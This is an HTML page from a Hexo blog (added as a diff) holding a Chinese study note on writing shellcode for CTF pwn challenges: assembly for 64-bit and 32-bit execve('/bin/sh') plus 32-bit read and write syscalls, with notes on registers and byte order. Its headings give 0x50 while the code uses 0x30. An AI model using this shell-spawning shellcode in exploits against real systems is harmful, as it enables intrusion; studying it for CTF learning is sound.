@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>shellcode学习 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="shellcode部分最近碰到用汇编写shellcode的不少，所以记录一下部分函数的shellcode 64位execve(&quot;bin&#x2F;sh&quot;,0,0)函数原型:int execve(const char * filename,char * const argv[ ],char * const envp[ ]) 12345678910xor    rdi,rdi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode学习">
+<meta property="og:url" content="http://example.com/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="shellcode部分最近碰到用汇编写shellcode的不少，所以记录一下部分函数的shellcode 64位execve(&quot;bin&#x2F;sh&quot;,0,0)函数原型:int execve(const char * filename,char * const argv[ ],char * const envp[ ]) 12345678910xor    rdi,rdi">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-31T08:36:49.000Z">
+<meta property="article:modified_time" content="2022-01-31T08:37:19.421Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-shellcode学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time class="dt-published" datetime="2022-01-31T08:36:49.000Z" itemprop="datePublished">2022-01-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      shellcode学习
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="shellcode部分"><a href="#shellcode部分" class="headerlink" title="shellcode部分"></a>shellcode部分</h2><p>最近碰到用汇编写shellcode的不少，所以记录一下部分函数的shellcode</p>
+<h3 id="64位execve-quot-bin-sh-quot-0-0"><a href="#64位execve-quot-bin-sh-quot-0-0" class="headerlink" title="64位execve(&quot;bin/sh&quot;,0,0)"></a>64位<code>execve(&quot;bin/sh&quot;,0,0)</code></h3><p>函数原型:<br><code>int execve(const char * filename,char * const argv[ ],char * const envp[ ])</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor    rdi,rdi              <span class="comment"># 初始化 rdi = rsi = rdx = rax = 0</span></span><br><span class="line">xor    rsi,rsi              <span class="comment"># argv[] = 0</span></span><br><span class="line">xor    rdx,rdx              <span class="comment"># envp[] = 0</span></span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax                  <span class="comment"># \00截断</span></span><br><span class="line">mov rbx,<span class="number">0x68732f2f6e69622f</span>  <span class="comment"># /bin/sh 的ascll码</span></span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp              <span class="comment"># filename = /bin/sh</span></span><br><span class="line">mov    al,<span class="number">0x3b</span>              <span class="comment"># rax = 59(execve的系统调用号)</span></span><br><span class="line">syscall                     </span><br></pre></td></tr></table></figure>
+
+<h3 id="32位execve-quot-bin-sh-quot-0-0"><a href="#32位execve-quot-bin-sh-quot-0-0" class="headerlink" title="32位execve(&quot;bin/sh&quot;,0,0)"></a>32位<code>execve(&quot;bin/sh&quot;,0,0)</code></h3><p>函数原型:<br><code>int execve(const char* filename, char* const argv[ ], char* const envp[ ])</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx                 <span class="comment"># argv[] = 0</span></span><br><span class="line">xor edx,edx                 <span class="comment"># envp[] = 0</span></span><br><span class="line">push edx                    <span class="comment"># \00截断</span></span><br><span class="line">push <span class="number">0x68732f2f</span>             <span class="comment"># /sh</span></span><br><span class="line">push <span class="number">0x6e69622f</span>             <span class="comment"># /bin</span></span><br><span class="line">mov ebx,esp                 <span class="comment"># filename = /bin/sh</span></span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,<span class="number">0xB</span>                  <span class="comment"># rax = 11(execve的系统调用号)</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="32位write-1-ebp-12-0x50"><a href="#32位write-1-ebp-12-0x50" class="headerlink" title="32位write(1,ebp+12,0x50)"></a>32位<code>write(1,ebp+12,0x50)</code></h3><p>函数原型：<br><code>ssize_t write(int fd, const void* buf, size_t count)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,[ebp+<span class="number">12</span>]            <span class="comment"># buf = ebp + 12 </span></span><br><span class="line">mov eax,<span class="number">0x4</span>;                <span class="comment"># eax = 4(write的系统调用号)</span></span><br><span class="line">mov bl,<span class="number">0x1</span>;                 <span class="comment"># fd = 1</span></span><br><span class="line">mov edx,<span class="number">0x30</span>                <span class="comment"># count = 0x30</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="32位read-0-ebp-12-0x50"><a href="#32位read-0-ebp-12-0x50" class="headerlink" title="32位read(0,ebp+12,0x50)"></a>32位<code>read(0,ebp+12,0x50)</code></h3><p>函数原型：<br><code>ssize_t read(int fd, const void* buf, size_t count)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,[ebp+<span class="number">12</span>]            <span class="comment"># buf = ebp + 12 </span></span><br><span class="line">mov eax,<span class="number">0x3</span>;                <span class="comment"># eax = 3(read的系统调用号)</span></span><br><span class="line">mov bl,<span class="number">0x0</span>;                 <span class="comment"># fd = 0</span></span><br><span class="line">mov edx,<span class="number">0x30</span>                <span class="comment"># count = 0x30</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>64位系统调用为<code>syscall</code>;32位系统调用为<code>int 0x80</code></li>
+<li>64位参数存入顺序为<code>rdi,rsi,rdx...</code>,其中<code>rax</code>存储系统调用号；32位参数存入顺序为<code>ebx,ecx,edx...</code>,其中<code>eax</code>存储系统调用号</li>
+<li>数据在计算机内部采用小端序存储，所以数据都是从右向左读取，例如：<code>0x68732f2f6e69622f</code>,按习惯来看，是<code>hs/nib/</code>,但实际上是<code>/bin/sh</code></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/" data-id="ckz2fw2q200019kjx041zf31p" data-title="shellcode学习" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/01/30/wustctf2020-getshell-2/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">wustctf2020_getshell_2</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/30/wustctf2020-getshell-2/">wustctf2020_getshell_2</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">unbuntu18.04pwn环境搭建</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/">添加模板</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
